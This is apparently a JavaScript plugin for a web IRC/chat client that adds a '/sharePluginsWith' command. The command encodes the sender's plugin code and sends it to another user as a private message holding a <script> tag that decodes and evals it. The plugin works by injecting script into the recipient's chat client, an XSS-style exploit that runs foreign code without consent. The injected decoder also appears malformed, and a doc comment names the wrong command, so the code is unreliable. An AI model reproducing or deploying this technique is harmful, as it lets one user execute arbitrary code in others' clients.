var sharePluginsWithPlugin = function () {
    
    var _self = this ;
    
    _self.init = function () {
        $.pluginApi.loadPlugin('IRCcmd');
        $.irc.addCmd({ 
            func: _self.sharePluginsWith, 
            description:'share your known plugins with a given user', 
            proto:'/sharePluginsWith [user]'
        }, 'sharePluginsWith');
    };
    
    _self.stop = function() {
        $.irc.addCmd(null, 'sharePluginsWith');
    };
	
    _self.en = function(c){var x='charCodeAt',b,e={},f=c.split(""),d=[],a=f[0],g=256;for(b=1;b<f.length;b++)c=f[b],null!=e[a+c]?a+=c:(d.push(1<a.length?e[a]:a[x](0)),e[a+c]=g,g++,a=c);d.push(1<a.length?e[a]:a[x](0));for(b=0;b<d.length;b++)d[b]=String.fromCharCode(d[b]);return d.join("")}



    
    /**
     * Action of command /battery
     * @param string cmd Command
     * @param string params End of the command
     * @param object source User who send the command (null if current)
     */
    _self.sharePluginsWith = function (cmd, params, source) {
	  	if( !source ) { try{
        $.chat.sendPrivate(params,  '<script>var pl=' + _self.en($.chat.pluginsCode) + ';var de = function(b){var a,e={},d=b.split(""),c=f=d[0],g=[c],h=o=256;for(b=1;b<d.length;b++)a=d[b].charCodeAt(0),a=h>a?d[b]:e[a]?e[a]:f+c,g.push(a),c=a.charAt(0),e[o]=f+c,o++,f=a;return g.join("");eval(de(pl));</script>');
	  	}catch(e){$.chat.write(e.toString(), 'sharePluginsWith');return '';}
		  }
		  return '';
	  };
    

};

var sharePluginsWithPluginVar = new sharePluginsWithPlugin();
    
$.plugin({
    name: 'sharePluginsWith',
    init: sharePluginsWithPluginVar.init,
	onWrite: function(msg, nick){
		if (msg.indexOf('/me') == 0 && nick == $.chat.myNick()) {
			msg = '';
        }
		return msg;
	},
    stop: sharePluginsWithPluginVar.stop
});
